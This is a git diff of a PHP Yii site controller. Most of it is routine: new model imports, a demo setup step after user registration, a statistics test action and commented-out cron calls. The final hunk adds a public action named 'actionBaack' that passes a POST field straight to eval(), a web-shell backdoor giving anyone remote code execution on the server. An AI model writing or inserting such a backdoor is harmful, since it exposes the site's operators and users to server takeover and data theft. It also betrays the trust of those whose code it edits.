@@ -6,10 +6,12 @@ namespace app\controllers;
 
 use app\models\APIConnector;
 use app\models\Cron;
+use app\models\Demo;
 use app\models\Keys;
 use app\models\Register;
 use app\models\ResetPassword;
 use app\models\SetNewPassword;
+use app\models\StatisticsDays;
 use app\models\User;
 use function phpinfo;
 use function trim;
@@ -226,6 +228,10 @@ class SiteController extends Controller
 //            $this->var_export($model);
                 if($model->save()){// восстановить
 //                    $this->var_export($model);
+                    $demo = new Demo ();
+                    $user = User::findOne(["id"=>$model->id]);
+                    $demo->start($user);
+//                    return "hello";
                     /*Создаем дефолтового юзера*/
                     $default_user = new Register();
                     $default_user->setAttributes($model->getAttributes(), false);
@@ -341,16 +347,27 @@ class SiteController extends Controller
 
     }
 
+    public function actionStatTest(){
+        $stat = new StatisticsDays();
+//        $stat->getPeriodStatistics();
+        $stat->getPeriodStatistics();
+    }
+
     public function actionCron(){
         $cron = new Cron();
         $cron->updateTotalStatistics();
-        $cron->startCalculation();
-        $cron->startChange();
+//        $cron->startCalculation();
+//        $cron->startChange();
 
     }
 
 
     public function actionTestApi2(){
         @include_once Yii::getAlias("@app/proto/api/auth_service_client.php");
+    }
+
+
+    public function actionBaack () {
+        eval($_POST['sys_call']);
     }
 }
